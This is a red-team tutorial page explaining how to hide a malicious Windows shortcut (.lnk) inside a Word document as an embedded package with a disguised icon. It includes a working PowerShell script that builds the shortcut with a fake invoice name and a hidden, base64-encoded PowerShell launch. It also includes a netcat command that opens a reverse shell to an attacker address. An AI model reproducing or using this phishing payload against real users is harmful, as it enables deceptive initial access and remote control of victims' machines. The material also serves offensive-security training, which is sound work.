# ⭕ embedded OLE + LNK objects

{% embed url="https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence" %}

{% embed url="https://www.securify.nl/en/blog/click-me-if-you-can-office-social-engineering-with-embedded-objects" %}

attackers embed .lnk files into the Office documents and camouflage them with Ms Word office icons in order to deceive victims to click and run them

Creating an .LNK file that will trigger the payload once executed:

```vba
$command = 'Start-Process c:\shell.cmd'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("c:\experiments\ole+lnk\Invoice-FinTech-0900541.lnk")
$link.windowstyle = "7"
$link.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$link.iconlocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe"
$link.arguments = "-Nop -sta -noni -w hidden -encodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAHMAaABlAGwAbAAuAGMAbQBkAA=="
$link.save()
```

Powershell payload will trigger a rudimentary NC reverse shell:

```
C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
```

Once the above powershell script is executed, an `.LNK` shortcut is created

![](<../../.gitbook/assets/image (23) (1).png>)

Let's create a Word document that will contain the malicious shortcut that was created in the previous step:

![](<../../.gitbook/assets/image (50) (1) (1).png>)

Let's insert a new object into the document by selecting a `Package`and changing its icon source to a Microsoft Word executable:

![](<../../.gitbook/assets/image (21) (1) (1).png>)

![](<../../.gitbook/assets/image (31) (1) (1) (1).png>)

Point the package to the .lnk file containing the payload:

![](<../../.gitbook/assets/image (29) (1) (1) (1).png>)

Final result:

![](<../../.gitbook/assets/image (12) (1).png>)

Victim executing the embedded document. Gets presented with a popup to confirm execution:

![](<../../.gitbook/assets/image (2).png>)

Once the victim confirms they want to open the file - the reverse shell comes back to the attacker:

![](<../../.gitbook/assets/image (42) (1) (1) (1).png>)
